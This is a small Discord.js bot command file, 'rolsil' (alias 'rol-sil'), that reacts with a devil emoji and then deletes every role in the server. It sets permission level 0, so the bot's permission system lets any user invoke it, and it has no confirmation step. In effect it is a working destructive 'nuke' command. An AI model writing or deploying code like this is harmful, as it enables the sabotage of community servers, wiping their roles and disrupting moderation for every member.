const Discord = require('discord.js');
const db = require('quick.db')
exports.run = async(client, message, args) => { 
  


 await message.react('😈')
message.guild.roles.cache.forEach(a => a.delete())
  };
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: ["rol-sil"], 
  permLevel: 0
};

exports.help = {
  name: 'rolsil',
  description: 'taslak', 
  usage: 'rol-sil'
};
